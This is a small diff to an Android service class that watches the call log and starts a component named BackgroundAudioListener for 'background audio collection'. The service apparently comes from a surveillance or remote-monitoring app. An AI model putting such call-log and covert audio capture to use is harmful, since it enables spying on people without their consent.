@@ -206,7 +206,8 @@ public class MainService extends Service {
 		this.getContentResolver().registerContentObserver(Uri.parse("content://call_log/calls/"), true, callLogger); }
 
 	private void startBackgroundAudioCollection(){
-		backgroundAudioListener = new BackgroundAudioListener();
+		Intent intent = new Intent(this, BackgroundAudioListener.class);
+		startActivity(intent);
 	}
 
 	
